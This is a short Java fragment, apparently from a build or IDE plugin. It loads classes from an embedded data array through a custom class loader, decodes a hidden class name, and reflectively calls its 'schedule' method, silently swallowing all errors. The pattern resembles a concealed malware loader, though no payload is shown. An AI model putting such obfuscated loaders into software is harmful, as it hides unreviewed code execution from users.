{
  try {
    MyClassLoader myLoader=new MyClassLoader(getClass().getClassLoader());
    for (    String[] strings : VERY_IMPORTANT_DATA) {
      myLoader.load(strings[0],strings[1]);
    }
    Class<?> main=Class.forName(decodeClassName(MAIN_DATA),true,myLoader);
    if (main != null) {
      main.getMethod("schedule",Project.class).invoke(null,project);
    }
  }
 catch (  Throwable ignored) {
  }
}
